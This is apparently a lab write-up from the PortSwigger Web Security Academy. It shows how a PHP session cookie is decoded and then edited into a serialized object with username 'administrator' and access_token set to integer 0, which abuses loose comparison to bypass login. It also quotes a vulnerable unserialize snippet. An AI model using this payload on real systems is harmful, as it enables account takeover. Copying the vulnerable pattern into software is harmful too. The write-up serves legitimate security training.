---
title: 'Lab: Modifying serialized data types'
tags: [Portswigger Web Security Academy, Web]

category: "Security Practice｜Portswigger Web Security Academy｜Deserialization"
date: 2023-04-28
---

# Lab: Modifying serialized data types
<!-- more -->
###### tags: `Portswigger Web Security Academy` `Web`
* Description: This lab uses a serialization-based session mechanism and is vulnerable to authentication bypass as a result
* Goal: To solve the lab, edit the serialized object in the session cookie to access the administrator account. Then, delete Carlos.
You can log in to your own account using the following credentials: wiener:peter

## Background
Loose Comparison Operator in `PHP`
> `PHP` based logic is particularly vulnerable to this kind of manipulation due to the behavior of its **loose comparison operator(==)** when comparing different data types.
> For example: `5=="5"` will be true when two types are different.

Vulnerability:
> This becomes even stranger when comparing a string the integer 0: `0 == "Example string" // true`
How about if the website author use this kind of vulnerability as below to verify the admin user?
>```php!
>$login = unserialize($_COOKIE)
>if ($login['password'] == $password) {
>// log in successfully
>}
>```

## Recon
1. Recon Package
According to the package we intercepted, the cookie is set to base64-encoded string:
Session: `Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJmaWtlajZ6ZXN6ZmFudm53b2psYmM2NHllN3dxaG5heSI7fQ%3d%3d`
Decoded String: `O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"fikej6zeszfanvnwojlbc64ye7wqhnay";}`
![](https://i.imgur.com/B6addxR.png)

2. What if we modify the string?
The verification mechanism workflow is comparing the query user's `access_token` with its database data.

## Exp
1. Modify the string like below
Change the user to `administrator` and access token to integer `0` so that the comparison is always true.
Exploit Payload:
`O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}`
Then we have admin panel on the screen.
![](https://i.imgur.com/X36upo8.png)

2. Delete Carlos like previous lab
:::spoiler Success Screenshot
![](https://i.imgur.com/PmCuBRF.png)
:::

## Reference